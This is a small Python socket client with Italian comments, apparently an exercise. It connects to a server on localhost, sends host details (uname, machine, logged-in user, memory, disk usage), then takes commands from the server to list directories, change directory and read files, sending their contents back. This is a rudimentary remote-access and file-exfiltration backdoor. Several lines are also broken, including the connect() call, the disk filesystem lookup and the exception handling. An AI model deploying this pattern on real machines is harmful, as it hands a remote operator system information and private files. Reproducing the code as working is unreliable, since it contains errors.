from socket import *
import platform
import os
import psutil
serverName = 'localhost' #corrisponde a 127.0.0.1
serverPort = 12000 #usata solo per pairing iniziale, il S.O. assegna poi una porta
clientSocket = socket(AF_INET,SOCK_STREAM)
clientSocket.connect((serverName,serverPort)) + '\n'
uname = 'Uname:	' + ''.join(platform.uname()) + '\n'
machine = 'Machine:	' + platform.machine() + '\n'
user = 'User:	' + os.getlogin() + '\n'
memory = 'Memory:	' + str(int((psutil.virtual_memory().total) / 1048576)) + 'MB\n'
memory += 'Disk Usage:	' + str(psutil.disk_usage('/').percent) + '%\n'	
disktype = 'Disk File System:	' + psutil.disk_partitions.fstype
clientSocket.send(uname.encode()) #manda architettura
clientSocket.send(machine.encode())
clientSocket.send(user.encode())
clientSocket.send(memory.encode())
ack = clientSocket.recv(1024).decode() #recv(1024) indica che riceviamo al massimo 1024 byte
command = ''
while command != 'exit':
    command = clientSocket.recv(2048).decode()
    print(command)
    if(command == 'ls'):
        path = os.getcwd()
        clientSocket.send(path.encode())
        clientSocket.send(str(os.listdir(path)).encode())
    if(command.startswith('1')):
        try:
            if(command[1:] != '..'):
                os.chdir(command[1:])
            else:
                os.chdir(os.path.normpath(os.getcwd() + os.sep + os.pardir))
            path = os.getcwd()
            clientSocket.send(path.encode())
        except Exception as e:
            clientSocket.send(e.encode())
    if(command.startswith('0')):
        print(command)
        file = open(command[1:], "r")	
        data = file.read()
        clientSocket.send(data.encode())
        file.close()
clientSocket.close()
